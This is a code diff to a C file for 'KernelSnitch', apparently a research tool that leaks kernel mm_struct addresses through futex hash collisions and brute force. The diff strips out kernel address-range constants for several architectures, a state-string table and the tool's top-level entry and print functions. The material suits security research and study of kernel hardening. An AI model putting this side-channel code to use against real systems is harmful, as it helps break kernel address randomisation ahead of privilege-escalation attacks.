@@ -14,10 +14,6 @@
 #include <stdlib.h>
 #include <pthread.h>
 
-#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
-#define __INTEL
-#endif
-
 #define FUTEX_SZ (64ULL<<30)
 #define FUTEX_MMAP_SZ (1ULL<<30)
 #ifndef PAGE_SIZE
@@ -28,13 +24,6 @@
 #endif
 #define APPENDED_FUTEXES 4096
 #define MULITPLE 4
-#if defined(__INTEL) || defined(__AMD)
-#define IDENTITY_START 0xffff888000000000ULL
-#define IDENTITY_END   0xffffc88000000000ULL
-#define COARSE_SZ (1ULL << 30)
-#elif defined(__ARM)
-#define VA_BITS 39
-#if VA_BITS==39
 #ifndef KERNELSNITCH_IDENTITY_START
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #endif
@@ -43,15 +32,7 @@
 #endif
 #define IDENTITY_START KERNELSNITCH_IDENTITY_START
 #define IDENTITY_END   KERNELSNITCH_IDENTITY_END
-// #define IDENTITY_END   0xffffffc000000000ULL
-#elif VA_BITS==48
-#define IDENTITY_START 0xffff000000000000ULL
-#define IDENTITY_END   0xffff800000000000ULL
-#else
-#error "Unsupported VA_BITS (expected 39 or 48)"
-#endif
 #define COARSE_SZ (1ULL << 30)
-#endif
 
 enum kernelsnitch_state {
     KERNELSNITCH_NOT_INIT = 0,
@@ -61,13 +42,6 @@ enum kernelsnitch_state {
     KERNELSNITCH_MM_FOUND,
     KERNELSNITCH_MM_NOT_FOUND,
     KERNELSNITCH_LAST,
-};
-char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
-    "not initialized",
-    "initialized",
-    "collisions found",
-    "mm_struct found",
-    "mm_struct not found",
 };
 
 struct kernelsnitch_shared_state {
@@ -394,57 +368,4 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     if (ks->verbose) pr_info("done\n");
     munmap(ks, sizeof(struct kernelsnitch_shared_state));
     return ret;
-}
-
-/**
- * Performs KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @arg __mm_slab_order: the order of the mm_struct slab
- * @arg __thread_cnt: thread count used for the bruteforcing phase
- * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
- * @arg __verbose: amount of print info (1...enabled; 0...disabled)
- * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
- * @return the found mm_struct or -1 for not found
- */
-size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
-{
-    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
-    if (ks->verbose) pr_info("===============================================\n");
-    kernelsnitch_find_collisions(ks);
-    if (ks->verbose) pr_info("===============================================\n");
-    kernelsnitch_bruteforce(ks);
-    if (ks->verbose) pr_info("===============================================\n");
-    return kernelsnitch_cleanup(ks);
-}
-
-/**
- * Prints the current execution state KernelSnitch is in
- * @arg ks: shared KernelSnitch state
- */
-void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
-{
-    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
-}
-
-/**
- * Prints the found collisions
- * @arg ks: shared KernelSnitch state
- */
-void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
-{
-    pr_info("collisions:\n");
-    for (size_t i = 2; i < ks->collisions; ++i) {
-        size_t addr = ks->futex_addrs[i];
-        pr_info("  %016zx\n", addr);
-    }
-}
-
-/**
- * KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @return: the found mm_struct address
- */
-size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
-{
-    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0);
 }
